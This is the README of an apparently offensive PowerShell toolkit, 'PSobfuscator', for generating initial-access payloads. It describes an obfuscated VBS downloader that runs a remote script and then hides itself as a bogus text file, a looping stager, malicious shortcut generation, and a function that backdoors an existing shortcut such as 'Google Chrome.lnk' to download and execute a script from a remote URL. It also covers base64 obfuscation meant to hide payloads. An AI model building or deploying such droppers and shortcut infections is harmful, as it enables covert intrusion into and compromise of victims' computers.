# PSobfuscator

The result of porting some functionality from gen-obfuscated into the powershell clients.
These are those functions, plus some original content in a stand alone version that can 
be run from windows to generate payloads to get initial access.

This is not complete and the under utilized functions will be expanded upon, or you can
do you own thing and not have to wait.

Available functions.

### simple-downloader "Url-hosting-script" 
Generates an obfuscated vbs script that will download and execute 
a powershell script. After execution it rewrites itself into a txt 
file with bogus info and opens in notepad.

### looping-stager "Url-hosting-script" 
Generates a command string for use kicks 
of a looping downloader.

### gen-shorcut "Url-hosting-script" 
Creates a shortcut that downloads and executes the script found in the 
provided url.
	

### shortcut-infect "name-of-lnk" "Url-hosting-script" 
Modifies the specified existing shortcut to run the original program 
and also execute a download and execute command string. 
	
   example: shortcut-infect "Google Chrome.lnk" "http://some-doman[.]com/hello.ps1" 
   requires the http:// or https:// in the URL.

Only run this on the target system.

### obfuscate "name of text file / script"
Uses a polyalphabetic obfuscation method on base64 strings writes 
obfuscated string to file and provides a de-obfuscation key.


### de-obfuscate "name of text file / script" "key" 
Performs the inverse of the obfuscation function requires the text 
file with the obfuscated base64 data and de-obfuscation key as parameters.


### gen-key
generates a random alphabetic string for use with the obfuscate-base64 
function.


### obfuscate-base64 "(action:hide or clear ), (key: obfuscation or de-ofuscation), (base64-string)" 
The function that contains the obfuscation engine, it works only 
with clear base64 data. It's UTF8 so do not use this for 
powershell encoded commands.


### byte-encode "binary-to-obfuscate" "key" 
Performs byte-encoding prior to converting to obfuscated base64 
provide key de-obfuscation.


### byte-decode "file-containing-obfu-base64" "key" 
performs the reverse of byte-encode, requires the de-obfuscation key.


### gen-enccmd "your command string"
Generates a PowerShell formatted encoded command. Insure to quote 
your command string.
	
   example: gen-enccmd "cmd /c ipconfig /all"

### dec-enccmd "Your encoded command string" 
Decodes the base64 string and displays the original string.


IMPORTANT !!!
Be sure to dot source this script or iex to import these function 
into your current powershell session for this to work.

example: 
```
PS C:\>	. .\PSobfuscator.ps1
```


